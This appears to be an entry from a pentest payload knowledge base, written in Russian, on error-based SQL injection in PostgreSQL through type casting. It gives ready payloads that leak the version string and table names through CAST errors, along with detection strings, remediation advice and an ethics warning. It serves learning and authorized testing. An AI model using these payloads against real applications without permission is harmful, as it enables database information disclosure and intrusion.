---
id: sqli-postgresql-error-based-cast
title: "PostgreSQL: error-based через приведение типов"
type: sqli
target: postgresql
category: web
difficulty: intermediate
bypass: none
tags: [sqli, postgresql, error-based]
tested_on: ["PostgreSQL 13", "PostgreSQL 15"]
success_rate: 0.8
risk: medium
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# PostgreSQL: error-based через приведение типов

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' AND 1=CAST((SELECT version()) AS INT) --
```

## Explanation

PostgreSQL строго типизирован: попытка привести текст к `INT` вызывает ошибку
`invalid input syntax for type integer: "PostgreSQL 15.2 ..."` — и значение подзапроса
попадает прямо в текст ошибки. Это самый простой способ вывести данные, когда UNION
неудобен. Комментарий в PostgreSQL — `--` (без обязательного пробела, в отличие от MySQL).

## Detection

В ответе/логах ищите `invalid input syntax for`, `ERROR:  operator does not exist`,
синтаксис PostgreSQL (`::`), `pg_catalog`.

## Remediation

- Параметризованные запросы (psycopg `%s`, asyncpg `$1`).
- Отключить вывод ошибок БД клиенту; логировать на сервере.
- Ограничить права роли приложения (`NOINHERIT`, только нужные таблицы).

## Variants

```
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT) --
```

```
'||(SELECT version())||'
```
